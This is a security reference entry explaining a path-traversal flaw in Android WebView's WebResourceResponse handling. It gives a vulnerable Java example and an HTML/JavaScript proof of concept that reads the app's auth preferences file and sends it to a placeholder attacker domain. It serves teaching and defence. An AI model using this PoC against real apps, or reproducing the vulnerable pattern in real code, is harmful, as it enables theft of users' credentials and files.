# WebResourceResponse overview

[WebResourceResponse](https://developer.android.com/reference/android/webkit/WebResourceResponse) is a class that allows an Android application to emulate the server within WebView by intercepting requests and returning arbitrary content (including a status code, content type, content encoding, headers and the response body) from the application's code itself without making any actual requests to the server.

# Security issues

## Access to arbitrary files

If you control a path of the returned file and have a XSS or the ability to open arbitrary links inside a WebView, you can gain access to arbitrary files via XHR requests.

For example, if there is the following `WebResourceResponse` implementation:

```java
WebView webView = findViewById(R.id.webView);
webView.setWebViewClient(new WebViewClient() {
   public WebResourceResponse shouldInterceptRequest(WebView view, WebResourceRequest request) {
       Uri uri = request.getUrl();
       if (uri.getPath().startsWith("/local_cache/")) {
           File cacheFile = new File(getCacheDir(), uri.getLastPathSegment());
           if (cacheFile.exists()) {
               InputStream inputStream;
               try {
                   inputStream = new FileInputStream(cacheFile);
               } catch (IOException e) {
                   return null;
               }
               Map<String, String> headers = new HashMap<>();
               headers.put("Access-Control-Allow-Origin", "*");
               return new WebResourceResponse("text/html", "utf-8", 200, "OK", headers, inputStream);
           }
       }
       return super.shouldInterceptRequest(view, request);
   }
});
```

The PoC for the attack may look like the following one:

```html
<!DOCTYPE html>
<html>
<head>
   <title>Evil page</title>
</head>
<body>
<script type="text/javascript">
   function theftFile(path, callback) {
     var oReq = new XMLHttpRequest();

     oReq.open("GET", "https://any.domain/local_cache/..%2F" + encodeURIComponent(path), true);
     oReq.onload = function(e) {
       callback(oReq.responseText);
     }
     oReq.onerror = function(e) {
       callback(null);
     }
     oReq.send();
   }

   theftFile("shared_prefs/auth.xml", function(contents) {
       location.href = "https://attacker-website.com/?data=" + encodeURIComponent(contents);
   });
</script>
</body>
</html>
```

In the above example, the attack is possible because the `Uri.getLastPathSegment()` returns a decoded value that is used to generate the file path within the `new File(getCacheDir(), uri.getLastPathSegment())` line.

Policies like CORS still work inside a WebView. Therefore, requests to the `any.domain` are not allowed without the `Access-Control-Allow-Origin: *` header. However, this restriction does not affect this PoC since the `WebResourceResponse` implementation checks uses only the URL path and you can replace `any.domain` with the current origin.

References:
- [Writeup: Amazon Shopping and Amazon India Online Shopping apps: Access arbitrary files owned by Amazon apps](https://blog.oversecured.com/Android-Exploring-vulnerabilities-in-WebResourceResponse/#an-overview-of-the-vulnerability-in-amazon%E2%80%99s-apps)

# References

- [Android: Exploring vulnerabilities in WebResourceResponse](https://blog.oversecured.com/Android-Exploring-vulnerabilities-in-WebResourceResponse/)
